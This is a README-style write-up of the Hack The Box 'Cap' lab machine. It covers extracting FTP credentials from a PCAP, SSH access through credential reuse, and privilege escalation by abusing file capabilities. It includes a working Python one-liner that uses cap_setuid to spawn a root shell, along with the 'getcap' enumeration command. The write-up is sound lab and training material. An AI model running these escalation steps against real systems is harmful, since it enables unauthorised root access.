# htb-cap-writeup
Hack The Box Cap machine write-up and notes.
# 🧠 HTB Cap - Write-up

## 🔍 Overview

Cap is an easy Hack The Box Linux machine focused on network traffic analysis, credential extraction, and Linux privilege escalation using file capabilities.

---

## 🎯 Objectives

* Analyze a PCAP file
* Extract credentials from network traffic
* Gain initial SSH access
* Escalate privileges using Linux capabilities

---

## 🌐 Enumeration

Initial scan revealed the following services:

* FTP (21)
* SSH (22)
* HTTP (80)

A web application allowed downloading of network capture (PCAP) files.

---

## 📡 PCAP Analysis

The PCAP file was analyzed using Wireshark.

Using TCP stream analysis, FTP credentials were discovered in plaintext traffic:

```text id="cap01"
USER nathan
PASS <password>
```

These credentials were later reused for SSH access.

---

## 🔑 Initial Access

SSH login was performed using the recovered credentials:

```bash id="cap02"
ssh nathan@<10.10.X.X>
```

Successful login confirmed credential reuse vulnerability.

---

## ⚙️ Privilege Escalation

System enumeration revealed Linux capabilities:

```bash id="cap03"
getcap -r / 2>/dev/null
```
Explanation:
This command searches the entire filesystem for binaries with Linux capabilities that could be abused for privilege escalation.

Output showed:

```text id="cap04"
/usr/bin/python3.8 = cap_setuid+ep
```

---

## 🚨 Exploitation

Python was abused to escalate privileges by setting UID to root:

```bash id="cap05"
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Verification:

```bash id="cap06"
id
uid=0(root)
```

---

## 🏁 Root Access

Root access was achieved successfully.

```bash id="cap07"
cat /root/root.txt
```

---

## 💡 Key Learnings

* FTP traffic is insecure and can expose credentials
* Credential reuse is a critical security risk
* Linux capabilities can be exploited for privilege escalation
* `getcap` is an important enumeration tool

---

## 🧠 Conclusion

Cap demonstrates a full attack chain from network sniffing to root compromise. It is an excellent introduction to real-world penetration testing techniques.
